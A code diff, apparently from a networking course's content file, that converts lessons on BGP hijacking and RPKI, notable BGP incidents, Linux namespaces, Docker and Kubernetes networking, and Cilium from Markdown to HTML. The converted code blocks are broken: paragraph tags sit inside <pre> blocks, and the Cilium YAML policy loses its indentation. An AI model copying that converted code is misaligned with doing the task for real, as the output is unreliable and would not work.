+<tr><td><strong>Prefix hijack</strong></td><td>Announce exact same prefix</td><td>Traffic splits (some goes to attacker)</td></tr>
+<tr><td><strong>Sub-prefix hijack</strong></td><td>Announce more specific prefix (/25 vs /24)</td><td>All traffic goes to attacker (longest match wins)</td></tr>
+<tr><td><strong>AS path poisoning</strong></td><td>Fake shorter AS path</td><td>Traffic prefers attacker's "shorter" path</td></tr>
+<tr><td><strong>Route leak</strong></td><td>Accidentally share internal routes externally</td><td>Traffic takes wrong path</td></tr>
+</tbody></table>
 
-**What attackers can do with hijacked traffic:**
-- **Black hole** — drop all traffic (denial of service)
-- **Intercept** — read traffic, then forward to real destination (man-in-the-middle)
-- **Impersonate** — serve fake content (phishing, malware)
+<p><strong>What attackers can do with hijacked traffic:</strong></p>
+<ul>
+<li><strong>Black hole</strong> — drop all traffic (denial of service)</li>
+<li><strong>Intercept</strong> — read traffic, then forward to real destination (man-in-the-middle)</li>
+<li><strong>Impersonate</strong> — serve fake content (phishing, malware)</li>
+</ul>
 
-**RPKI (Resource Public Key Infrastructure):**
+<p><strong>RPKI (Resource Public Key Infrastructure):</strong></p>
 
-\`\`\`
-RPKI chain:
-IANA → RIR (ARIN/RIPE) → ISP → signs ROA
+<pre><code>RPKI chain:
+<p>IANA → RIR (ARIN/RIPE) → ISP → signs ROA</p>
 
-ROA (Route Origin Authorization):
-"AS13335 is authorized to announce 1.1.1.0/24"
-  ↓ signed by ARIN's certificate
+<p>ROA (Route Origin Authorization):</p>
+<p>"AS13335 is authorized to announce 1.1.1.0/24"</p>
+<p>↓ signed by ARIN's certificate</p>
 
-Router with RPKI validation:
-- Receives BGP announcement: "AS9999 has route to 1.1.1.0/24"
-- Checks RPKI: ROA says only AS13335 can announce this
-- Result: INVALID → route rejected
-\`\`\`
+<p>Router with RPKI validation:</p>
+<ul>
+<li>Receives BGP announcement: "AS9999 has route to 1.1.1.0/24"</li>
+<li>Checks RPKI: ROA says only AS13335 can announce this</li>
+<li>Result: INVALID → route rejected</li>
+</ul>
+</code></pre>
 
-**RPKI validation states:**
-- **Valid** — ROA exists and matches (accept)
-- **Invalid** — ROA exists but doesn't match (reject)
-- **Not Found** — no ROA exists (accept, but less trusted)
+<p><strong>RPKI validation states:</strong></p>
+<ul>
+<li><strong>Valid</strong> — ROA exists and matches (accept)</li>
+<li><strong>Invalid</strong> — ROA exists but doesn't match (reject)</li>
+<li><strong>Not Found</strong> — no ROA exists (accept, but less trusted)</li>
+</ul>
 
-**Current adoption (2025):**
-- ~55% of routes have ROAs
-- ~35% of networks perform RPKI validation
-- Growing fast — major incidents push adoption`
+<p><strong>Current adoption (2025):</strong></p>
+<ul>
+<li>~55% of routes have ROAs</li>
+<li>~35% of networks perform RPKI validation</li>
+<li>Growing fast — major incidents push adoption</li>
+</ul>`
       },
       {
         titleEn: "Historical BGP Incidents",
-        contentEn: `**Major BGP incidents that shaped internet routing security:**
+        contentEn: `<p><strong>Major BGP incidents that shaped internet routing security:</strong></p>
 
-| Year | Incident | What Happened | Impact | Duration |
-|---|---|---|---|---|
-| **2004** | TTNet (Turkey) | Announced 0.0.0.0/0 (default route) — "I'm the entire internet" | Internet disruption in parts of Europe | Hours |
-| **2008** | Pakistan Telecom / YouTube | Announced YouTube's /25 to block it locally — leaked globally | YouTube down worldwide | ~2 hours |
-| **2010** | China Telecom | Announced ~37,000 prefixes belonging to others | 15% of internet routed through China for 18 minutes | 18 min |
-| **2017** | Google (accidental) | Leaked Japanese network prefixes to global BGP | Major internet outage in Japan | 1 hour |
-| **2018** | eNet / Amazon DNS | Hijacked Route53 DNS IPs → redirected MyEtherWallet users | ~$150K cryptocurrency stolen | 2 hours |
-| **2019** | China Telecom | Rerouted European mobile traffic through China | Potential interception of millions of users | 2 hours |
-| **2020** | Rostelecom (Russia) | Hijacked prefixes of Google, Amazon, Cloudflare, Akamai | Traffic rerouted through Russia | 1 hour |
-| **2022** | Russian ISPs | Multiple BGP hijacks during Ukraine conflict | Traffic interception attempts | Ongoing |
-| **2024** | Orange Spain | Attacker gained RIPE account access, created bad ROAs | Major ISP routing disruption | Hours |
+<table>
+<thead><tr><th>Year</th><th>Incident</th><th>What Happened</th><th>Impact</th><th>Duration</th></tr></thead>
+<tbody>
+<tr><td><strong>2004</strong></td><td>TTNet (Turkey)</td><td>Announced 0.0.0.0/0 (default route) — "I'm the entire internet"</td><td>Internet disruption in parts of Europe</td><td>Hours</td></tr>
+<tr><td><strong>2008</strong></td><td>Pakistan Telecom / YouTube</td><td>Announced YouTube's /25 to block it locally — leaked globally</td><td>YouTube down worldwide</td><td>~2 hours</td></tr>
+<tr><td><strong>2010</strong></td><td>China Telecom</td><td>Announced ~37,000 prefixes belonging to others</td><td>15% of internet routed through China for 18 minutes</td><td>18 min</td></tr>
+<tr><td><strong>2017</strong></td><td>Google (accidental)</td><td>Leaked Japanese network prefixes to global BGP</td><td>Major internet outage in Japan</td><td>1 hour</td></tr>
+<tr><td><strong>2018</strong></td><td>eNet / Amazon DNS</td><td>Hijacked Route53 DNS IPs → redirected MyEtherWallet users</td><td>~$150K cryptocurrency stolen</td><td>2 hours</td></tr>
+<tr><td><strong>2019</strong></td><td>China Telecom</td><td>Rerouted European mobile traffic through China</td><td>Potential interception of millions of users</td><td>2 hours</td></tr>
+<tr><td><strong>2020</strong></td><td>Rostelecom (Russia)</td><td>Hijacked prefixes of Google, Amazon, Cloudflare, Akamai</td><td>Traffic rerouted through Russia</td><td>1 hour</td></tr>
+<tr><td><strong>2022</strong></td><td>Russian ISPs</td><td>Multiple BGP hijacks during Ukraine conflict</td><td>Traffic interception attempts</td><td>Ongoing</td></tr>
+<tr><td><strong>2024</strong></td><td>Orange Spain</td><td>Attacker gained RIPE account access, created bad ROAs</td><td>Major ISP routing disruption</td><td>Hours</td></tr>
+</tbody></table>
 
-**Patterns in BGP incidents:**
-- Most hijacks are **accidental** (configuration mistakes, route leaks)
-- Intentional hijacks are often by **state actors** or for **financial gain**
-- Impact is always fast (minutes) because BGP propagates quickly
-- Recovery is slow (hours) because it requires manual intervention
+<p><strong>Patterns in BGP incidents:</strong></p>
+<ul>
+<li>Most hijacks are <strong>accidental</strong> (configuration mistakes, route leaks)</li>
+<li>Intentional hijacks are often by <strong>state actors</strong> or for <strong>financial gain</strong></li>
+<li>Impact is always fast (minutes) because BGP propagates quickly</li>
+<li>Recovery is slow (hours) because it requires manual intervention</li>
+</ul>
 
-**Defenses today:**
-- **RPKI/ROA** — proves who owns a prefix
-- **BGP communities** — signal "don't export" to prevent leaks
-- **ASPA (AS Provider Authorization)** — new, proves AS relationships
-- **BGP Flowspec** — distribute filtering rules via BGP
-- **Monitoring** — RIPE RIS, BGPStream, Cloudflare Radar detect anomalies
+<p><strong>Defenses today:</strong></p>
+<ul>
+<li><strong>RPKI/ROA</strong> — proves who owns a prefix</li>
+<li><strong>BGP communities</strong> — signal "don't export" to prevent leaks</li>
+<li><strong>ASPA (AS Provider Authorization)</strong> — new, proves AS relationships</li>
+<li><strong>BGP Flowspec</strong> — distribute filtering rules via BGP</li>
+<li><strong>Monitoring</strong> — RIPE RIS, BGPStream, Cloudflare Radar detect anomalies</li>
+</ul>
 
 {questions}
-1. The 2008 Pakistan/YouTube incident used a sub-prefix hijack (/25 vs /24). Why does this always win in BGP routing?
-2. The 2018 MyEtherWallet hijack combined BGP hijacking with DNS. Explain the attack chain.
-3. If RPKI was fully deployed, which incidents in the table would it have prevented? Which would it NOT prevent?`
+<ol>
+<li>The 2008 Pakistan/YouTube incident used a sub-prefix hijack (/25 vs /24). Why does this always win in BGP routing?</li>
+<li>The 2018 MyEtherWallet hijack combined BGP hijacking with DNS. Explain the attack chain.</li>
+<li>If RPKI was fully deployed, which incidents in the table would it have prevented? Which would it NOT prevent?</li>
+</ol>`
       }
     ]
   },
@@ -7879,250 +8696,271 @@ Router with RPKI validation:
     pages: [
       {
         titleEn: "Linux Network Namespaces",
-        contentEn: `**Containers use Linux namespaces for isolation. Network namespaces give each container its own network stack.**
+        contentEn: `<p><strong>Containers use Linux namespaces for isolation. Network namespaces give each container its own network stack.</strong></p>
 
-**What a network namespace provides:**
-- Own network interfaces (eth0, lo)
-- Own routing table
-- Own iptables/nftables rules
-- Own /proc/net
-- Completely separate from the host and other namespaces
+<p><strong>What a network namespace provides:</strong></p>
+<ul>
+<li>Own network interfaces (eth0, lo)</li>
+<li>Own routing table</li>
+<li>Own iptables/nftables rules</li>
+<li>Own /proc/net</li>
+<li>Completely separate from the host and other namespaces</li>
+</ul>
 
-**Hands-on with network namespaces:**
-\`\`\`bash
-# Create two namespaces
-ip netns add red
-ip netns add blue
+<p><strong>Hands-on with network namespaces:</strong></p>
+<pre><code>bash
+<p># Create two namespaces</p>
+<p>ip netns add red</p>
+<p>ip netns add blue</p>
 
-# Each has its own loopback (lo), nothing else
-ip netns exec red ip link list   # only lo
+<p># Each has its own loopback (lo), nothing else</p>
+<p>ip netns exec red ip link list   # only lo</p>
 
-# Create a veth pair (virtual ethernet — like a cable)
-ip link add veth-red type veth peer name veth-blue
+<p># Create a veth pair (virtual ethernet — like a cable)</p>
+<p>ip link add veth-red type veth peer name veth-blue</p>
 
-# Move each end to a namespace
-ip link set veth-red netns red
-ip link set veth-blue netns blue
+<p># Move each end to a namespace</p>
+<p>ip link set veth-red netns red</p>
+<p>ip link set veth-blue netns blue</p>
 
-# Assign IPs
-ip netns exec red ip addr add 10.0.0.1/24 dev veth-red
-ip netns exec blue ip addr add 10.0.0.2/24 dev veth-blue
+<p># Assign IPs</p>
+<p>ip netns exec red ip addr add 10.0.0.1/24 dev veth-red</p>
+<p>ip netns exec blue ip addr add 10.0.0.2/24 dev veth-blue</p>
 
-# Bring interfaces up
-ip netns exec red ip link set veth-red up
-ip netns exec blue ip link set veth-blue up
+<p># Bring interfaces up</p>
+<p>ip netns exec red ip link set veth-red up</p>
+<p>ip netns exec blue ip link set veth-blue up</p>
 
-# Now they can communicate
-ip netns exec red ping 10.0.0.2   # works!
-\`\`\`
+<p># Now they can communicate</p>
+<p>ip netns exec red ping 10.0.0.2   # works!</p>
+</code></pre>
 
-**veth pairs:**
-- Virtual ethernet cable — two ends, connected together
-- Packets in one end come out the other
-- Like a network cable between two virtual machines
-- This is how containers connect to the host network
+<p><strong>veth pairs:</strong></p>
+<ul>
+<li>Virtual ethernet cable — two ends, connected together</li>
+<li>Packets in one end come out the other</li>
+<li>Like a network cable between two virtual machines</li>
+<li>This is how containers connect to the host network</li>
+</ul>
 
-**The 6 Linux namespaces used by containers:**
-| Namespace | Isolates |
-|---|---|
-| **Network** | Network interfaces, routes, iptables |
-| **PID** | Process IDs (container sees PID 1) |
-| **Mount** | Filesystem mounts |
-| **UTS** | Hostname |
-| **IPC** | Shared memory, semaphores |
-| **User** | User/group IDs |`
+<p><strong>The 6 Linux namespaces used by containers:</strong></p>
+<table>
+<thead><tr><th>Namespace</th><th>Isolates</th></tr></thead>
+<tbody>
+<tr><td><strong>Network</strong></td><td>Network interfaces, routes, iptables</td></tr>
+<tr><td><strong>PID</strong></td><td>Process IDs (container sees PID 1)</td></tr>
+<tr><td><strong>Mount</strong></td><td>Filesystem mounts</td></tr>
+<tr><td><strong>UTS</strong></td><td>Hostname</td></tr>
+<tr><td><strong>IPC</strong></td><td>Shared memory, semaphores</td></tr>
+<tr><td><strong>User</strong></td><td>User/group IDs</td></tr>
+</tbody></table>`
       },
       {
         titleEn: "Docker Networking — Bridge, veth, NAT",
-        contentEn: `**Docker's default networking uses a Linux bridge + veth pairs + NAT.**
+        contentEn: `<p><strong>Docker's default networking uses a Linux bridge + veth pairs + NAT.</strong></p>
 
-**Architecture diagram:**
-\`\`\`
-Host Machine
-┌─────────────────────────────────────────────────┐
-│                                                 │
-│  Container A          Container B               │
-│  ┌──────────┐        ┌──────────┐              │
-│  │ eth0     │        │ eth0     │              │
-│  │ 172.17.  │        │ 172.17.  │              │
-│  │ 0.2      │        │ 0.3      │              │
-│  └────┬─────┘        └────┬─────┘              │
-│       │ veth-A            │ veth-B              │
-│       │                   │                     │
-│  ┌────┴───────────────────┴─────┐              │
-│  │        docker0 bridge         │              │
-│  │        172.17.0.1             │              │
-│  └──────────────┬───────────────┘              │
-│                 │                               │
-│            iptables NAT                         │
-│          (MASQUERADE)                           │
-│                 │                               │
-│  ┌──────────────┴───────────────┐              │
-│  │           eth0 (host)         │              │
-│  │        192.168.1.100          │              │
-│  └──────────────────────────────┘              │
-└─────────────────────────────────────────────────┘
-\`\`\`
+<p><strong>Architecture diagram:</strong></p>
+<pre><code>Host Machine
+<p>┌─────────────────────────────────────────────────┐</p>
+<p>│                                                 │</p>
+<p>│  Container A          Container B               │</p>
+<p>│  ┌──────────┐        ┌──────────┐              │</p>
+<p>│  │ eth0     │        │ eth0     │              │</p>
+<p>│  │ 172.17.  │        │ 172.17.  │              │</p>
+<p>│  │ 0.2      │        │ 0.3      │              │</p>
+<p>│  └────┬─────┘        └────┬─────┘              │</p>
+<p>│       │ veth-A            │ veth-B              │</p>
+<p>│       │                   │                     │</p>
+<p>│  ┌────┴───────────────────┴─────┐              │</p>
+<p>│  │        docker0 bridge         │              │</p>
+<p>│  │        172.17.0.1             │              │</p>
+<p>│  └──────────────┬───────────────┘              │</p>
+<p>│                 │                               │</p>
+<p>│            iptables NAT                         │</p>
+<p>│          (MASQUERADE)                           │</p>
+<p>│                 │                               │</p>
+<p>│  ┌──────────────┴───────────────┐              │</p>
+<p>│  │           eth0 (host)         │              │</p>
+<p>│  │        192.168.1.100          │              │</p>
+<p>│  └──────────────────────────────┘              │</p>
+<p>└─────────────────────────────────────────────────┘</p>
+</code></pre>
 
-**How it works step by step:**
-1. Docker creates the **docker0** bridge (like a virtual switch)
-2. Each container gets a **veth pair** — one end in container (eth0), one end on bridge
-3. Containers on the same bridge can talk to each other directly (Layer 2)
-4. To reach the internet: **iptables NAT** translates container IP → host IP
+<p><strong>How it works step by step:</strong></p>
+<ol>
+<li>Docker creates the <strong>docker0</strong> bridge (like a virtual switch)</li>
+<li>Each container gets a <strong>veth pair</strong> — one end in container (eth0), one end on bridge</li>
+<li>Containers on the same bridge can talk to each other directly (Layer 2)</li>
+<li>To reach the internet: <strong>iptables NAT</strong> translates container IP → host IP</li>
+</ol>
 
-**Docker network types:**
-| Type | Use Case | Isolation |
-|---|---|---|
-| **bridge** (default) | Container ↔ container on same host | Good |
-| **host** | Container uses host's network directly | None |
-| **none** | No networking at all | Full |
-| **overlay** | Container ↔ container across hosts (Swarm) | Good |
-| **macvlan** | Container gets real MAC/IP on physical network | Good |
+<p><strong>Docker network types:</strong></p>
+<table>
+<thead><tr><th>Type</th><th>Use Case</th><th>Isolation</th></tr></thead>
+<tbody>
+<tr><td><strong>bridge</strong> (default)</td><td>Container ↔ container on same host</td><td>Good</td></tr>
+<tr><td><strong>host</strong></td><td>Container uses host's network directly</td><td>None</td></tr>
+<tr><td><strong>none</strong></td><td>No networking at all</td><td>Full</td></tr>
+<tr><td><strong>overlay</strong></td><td>Container ↔ container across hosts (Swarm)</td><td>Good</td></tr>
+<tr><td><strong>macvlan</strong></td><td>Container gets real MAC/IP on physical network</td><td>Good</td></tr>
+</tbody></table>
 
-**Port mapping (bridge mode):**
-\`\`\`bash
-docker run -p 8080:80 nginx
-# iptables DNAT rule created:
-# Host:8080 → Container:80
-\`\`\``
+<p><strong>Port mapping (bridge mode):</strong></p>
+<pre><code>bash
+<p>docker run -p 8080:80 nginx</p>
+<p># iptables DNAT rule created:</p>
+<p># Host:8080 → Container:80</p>
+</code></pre>`
       },
       {
         titleEn: "Kubernetes Pod Networking",
-        contentEn: `**K8s networking rule: every Pod gets a real IP. Pods can reach any other Pod without NAT.**
+        contentEn: `<p><strong>K8s networking rule: every Pod gets a real IP. Pods can reach any other Pod without NAT.</strong></p>
 
-**Same node — Pod to Pod:**
-\`\`\`
-Node 1 (10.0.1.0/24)
-┌─────────────────────────────────────┐
-│  Pod A (10.0.1.2)    Pod B (10.0.1.3)│
-│  ┌────────┐         ┌────────┐      │
-│  │  eth0  │         │  eth0  │      │
-│  └───┬────┘         └───┬────┘      │
-│      │ veth              │ veth      │
-│  ┌───┴──────────────────┴───┐       │
-│  │       cbr0 bridge         │       │
-│  └───────────────────────────┘       │
-└─────────────────────────────────────┘
+<p><strong>Same node — Pod to Pod:</strong></p>
+<pre><code>Node 1 (10.0.1.0/24)
+<p>┌─────────────────────────────────────┐</p>
+<p>│  Pod A (10.0.1.2)    Pod B (10.0.1.3)│</p>
+<p>│  ┌────────┐         ┌────────┐      │</p>
+<p>│  │  eth0  │         │  eth0  │      │</p>
+<p>│  └───┬────┘         └───┬────┘      │</p>
+<p>│      │ veth              │ veth      │</p>
+<p>│  ┌───┴──────────────────┴───┐       │</p>
+<p>│  │       cbr0 bridge         │       │</p>
+<p>│  └───────────────────────────┘       │</p>
+<p>└─────────────────────────────────────┘</p>
 
-Pod A → bridge → Pod B (direct, Layer 2)
-\`\`\`
+<p>Pod A → bridge → Pod B (direct, Layer 2)</p>
+</code></pre>
 
-**Cross node — Pod to Pod on different nodes:**
-\`\`\`
-Node 1 (10.0.1.0/24)              Node 2 (10.0.2.0/24)
-┌──────────────────┐              ┌──────────────────┐
-│  Pod A (10.0.1.2)│              │  Pod C (10.0.2.5)│
-│  ┌────────┐      │              │  ┌────────┐      │
-│  │  eth0  │      │              │  │  eth0  │      │
-│  └───┬────┘      │              │  └───┬────┘      │
-│      │ veth      │              │      │ veth      │
-│  ┌───┴────┐      │              │  ┌───┴────┐      │
-│  │ bridge │      │              │  │ bridge │      │
-│  └───┬────┘      │              │  └───┬────┘      │
-│      │           │              │      │           │
-│  [eth0/tunnel]   │              │  [eth0/tunnel]   │
-└──────┬───────────┘              └──────┬───────────┘
-       │        Overlay / Routing        │
-       └────────────────────────────────┘
-\`\`\`
+<p><strong>Cross node — Pod to Pod on different nodes:</strong></p>
+<pre><code>Node 1 (10.0.1.0/24)              Node 2 (10.0.2.0/24)
+<p>┌──────────────────┐              ┌──────────────────┐</p>
+<p>│  Pod A (10.0.1.2)│              │  Pod C (10.0.2.5)│</p>
+<p>│  ┌────────┐      │              │  ┌────────┐      │</p>
+<p>│  │  eth0  │      │              │  │  eth0  │      │</p>
+<p>│  └───┬────┘      │              │  └───┬────┘      │</p>
+<p>│      │ veth      │              │      │ veth      │</p>
+<p>│  ┌───┴────┐      │              │  ┌───┴────┐      │</p>
+<p>│  │ bridge │      │              │  │ bridge │      │</p>
+<p>│  └───┬────┘      │              │  └───┬────┘      │</p>
+<p>│      │           │              │      │           │</p>
+<p>│  [eth0/tunnel]   │              │  [eth0/tunnel]   │</p>
+<p>└──────┬───────────┘              └──────┬───────────┘</p>
+<p>│        Overlay / Routing        │</p>
+<p>└────────────────────────────────┘</p>
+</code></pre>
 
-**Cross-node solutions (CNI plugins):**
-| Plugin | Method | Speed |
-|---|---|---|
-| **Flannel** | VXLAN overlay (encapsulation) | Good |
-| **Calico** | BGP routing (no overlay) | Fast |
-| **Cilium** | eBPF (replaces iptables + kube-proxy) | Fastest |
-| **Weave** | Encrypted overlay | Good |
+<p><strong>Cross-node solutions (CNI plugins):</strong></p>
+<table>
+<thead><tr><th>Plugin</th><th>Method</th><th>Speed</th></tr></thead>
+<tbody>
+<tr><td><strong>Flannel</strong></td><td>VXLAN overlay (encapsulation)</td><td>Good</td></tr>
+<tr><td><strong>Calico</strong></td><td>BGP routing (no overlay)</td><td>Fast</td></tr>
+<tr><td><strong>Cilium</strong></td><td>eBPF (replaces iptables + kube-proxy)</td><td>Fastest</td></tr>
+<tr><td><strong>Weave</strong></td><td>Encrypted overlay</td><td>Good</td></tr>
+</tbody></table>
 
-**K8s Service networking:**
-- **ClusterIP** — virtual IP, load balances to Pod IPs (kube-proxy / eBPF)
-- **NodePort** — exposes on every node's IP:port (30000-32767)
-- **LoadBalancer** — cloud provider provisions external LB
-- **Ingress** — L7 routing (host/path rules → Services)`
+<p><strong>K8s Service networking:</strong></p>
+<ul>
+<li><strong>ClusterIP</strong> — virtual IP, load balances to Pod IPs (kube-proxy / eBPF)</li>
+<li><strong>NodePort</strong> — exposes on every node's IP:port (30000-32767)</li>
+<li><strong>LoadBalancer</strong> — cloud provider provisions external LB</li>
+<li><strong>Ingress</strong> — L7 routing (host/path rules → Services)</li>
+</ul>`
       },
       {
         titleEn: "Cilium — eBPF Replaces iptables",
-        contentEn: `**Cilium uses eBPF to replace kube-proxy and iptables entirely.**
+        contentEn: `<p><strong>Cilium uses eBPF to replace kube-proxy and iptables entirely.</strong></p>
 
-**The iptables problem in Kubernetes:**
-\`\`\`
-With kube-proxy + iptables:
+<p><strong>The iptables problem in Kubernetes:</strong></p>
+<pre><code>With kube-proxy + iptables:
 
-Each Service creates ~8 iptables rules
-1000 Services = ~8000 rules
-Each rule = linear scan (O(n))
+<p>Each Service creates ~8 iptables rules</p>
+<p>1000 Services = ~8000 rules</p>
+<p>Each rule = linear scan (O(n))</p>
 
-Pod sends packet → iptables checks rule 1 → no match
-                 → checks rule 2 → no match
-                 → ...
-                 → checks rule 5847 → match! → forward
+<p>Pod sends packet → iptables checks rule 1 → no match</p>
+<p>→ checks rule 2 → no match</p>
+<p>→ ...</p>
+<p>→ checks rule 5847 → match! → forward</p>
 
-Time: O(n) per packet, n = number of rules
-Update: full iptables rewrite on any Service change
-\`\`\`
+<p>Time: O(n) per packet, n = number of rules</p>
+<p>Update: full iptables rewrite on any Service change</p>
+</code></pre>
 
-**Cilium's eBPF approach:**
-\`\`\`
-With Cilium:
+<p><strong>Cilium's eBPF approach:</strong></p>
+<pre><code>With Cilium:
 
-All Services stored in eBPF hash map
-Lookup = O(1) regardless of number of Services
+<p>All Services stored in eBPF hash map</p>
+<p>Lookup = O(1) regardless of number of Services</p>
 
-Pod sends packet → eBPF program → hash lookup → forward
+<p>Pod sends packet → eBPF program → hash lookup → forward</p>
 
-Time: O(1) per packet
-Update: single map entry update (no full rewrite)
-\`\`\`
+<p>Time: O(1) per packet</p>
+<p>Update: single map entry update (no full rewrite)</p>
+</code></pre>
 
-**Cilium features beyond basic networking:**
+<p><strong>Cilium features beyond basic networking:</strong></p>
 
-**L7 Network Policies:**
-\`\`\`yaml
-# Traditional K8s NetworkPolicy: L3/L4 only
-# "Pod A can talk to Pod B on port 80"
+<p><strong>L7 Network Policies:</strong></p>
+<pre><code>yaml
+<p># Traditional K8s NetworkPolicy: L3/L4 only</p>
+<p># "Pod A can talk to Pod B on port 80"</p>
 
-# Cilium CiliumNetworkPolicy: L7 aware
-apiVersion: cilium.io/v2
-kind: CiliumNetworkPolicy
-spec:
-  endpointSelector:
-    matchLabels:
-      app: api-server
-  ingress:
-  - fromEndpoints:
-    - matchLabels:
-        app: frontend
-    toPorts:
-    - ports:
-      - port: "80"
-      rules:
-        http:
-        - method: "GET"    # Allow GET
-          path: "/api/.*"
-        - method: "POST"   # Deny POST to /admin
-          path: "/admin"
-          # not listed = denied
-\`\`\`
+<p># Cilium CiliumNetworkPolicy: L7 aware</p>
+<p>apiVersion: cilium.io/v2</p>
+<p>kind: CiliumNetworkPolicy</p>
+<p>spec:</p>
+<p>endpointSelector:</p>
+<p>matchLabels:</p>
+<p>app: api-server</p>
+<p>ingress:</p>
+<ul>
+<li>fromEndpoints:</li>
+<li>matchLabels:</li>
+</ul>
+<p>app: frontend</p>
+<p>toPorts:</p>
+<ul>
+<li>ports:</li>
+<li>port: "80"</li>
+</ul>
+<p>rules:</p>
+<p>http:</p>
+<ul>
+<li>method: "GET"    # Allow GET</li>
+</ul>
+<p>path: "/api/.*"</p>
+<ul>
+<li>method: "POST"   # Deny POST to /admin</li>
+</ul>
+<p>path: "/admin"</p>
+<p># not listed = denied</p>
+</code></pre>
 
-**Hubble — network observability:**
-- Captures all network flows using eBPF
-- No sidecar proxy needed (unlike Istio/Envoy)
-- Shows: source pod → destination pod, protocol, verdict (allow/deny), latency
-- UI: real-time service dependency map
+<p><strong>Hubble — network observability:</strong></p>
+<ul>
+<li>Captures all network flows using eBPF</li>
+<li>No sidecar proxy needed (unlike Istio/Envoy)</li>
+<li>Shows: source pod → destination pod, protocol, verdict (allow/deny), latency</li>
+<li>UI: real-time service dependency map</li>
+</ul>
 
-**Performance comparison:**
+<p><strong>Performance comparison:</strong></p>
 
-| Metric | kube-proxy + iptables | Cilium eBPF |
-|---|---|---|
-| Service lookup | O(n) | O(1) |
-| Rule update | Full rewrite | Single entry |
-| Latency (1K services) | ~1ms | ~0.1ms |
-| CPU at 10K services | High | Low |
-| L7 policy | Not possible | Yes (HTTP, gRPC, Kafka) |
-| Observability | External tools | Built-in (Hubble) |
+<table>
+<thead><tr><th>Metric</th><th>kube-proxy + iptables</th><th>Cilium eBPF</th></tr></thead>
+<tbody>
+<tr><td>Service lookup</td><td>O(n)</td><td>O(1)</td></tr>
+<tr><td>Rule update</td><td>Full rewrite</td><td>Single entry</td></tr>
+<tr><td>Latency (1K services)</td><td>~1ms</td><td>~0.1ms</td></tr>
+<tr><td>CPU at 10K services</td><td>High</td><td>Low</td></tr>
+<tr><td>L7 policy</td><td>Not possible</td><td>Yes (HTTP, gRPC, Kafka)</td></tr>
+<tr><td>Observability</td><td>External tools</td><td>Built-in (Hubble)</td></tr>
+</tbody></table>
 
 {thinkOutside}
-Your company runs 500 microservices in Kubernetes. Currently using Flannel (VXLAN overlay) + kube-proxy (iptables). Users report latency spikes during deployments. What would you recommend changing, and why?`
+<p>Your company runs 500 microservices in Kubernetes. Currently using Flannel (VXLAN overlay) + kube-proxy (iptables). Users report latency spikes during deployments. What would you recommend changing, and why?</p>`
       }
     ]
   },
